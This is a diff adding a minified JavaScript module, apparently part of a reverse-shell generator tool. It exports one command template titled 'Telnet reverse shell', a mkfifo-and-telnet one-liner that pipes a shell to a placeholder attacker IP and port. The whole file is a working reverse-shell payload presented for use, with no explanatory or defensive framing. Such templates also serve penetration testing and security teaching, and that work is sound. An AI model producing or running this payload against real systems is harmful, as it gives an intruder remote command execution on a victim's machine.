@@ -1,0 +1,1 @@
+const e=[{title:"Telnet reverse shell",template:"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF",description:"Telnet reverse shell using named pipe and sh."}],t={commands:e};export{e as commands,t as default};
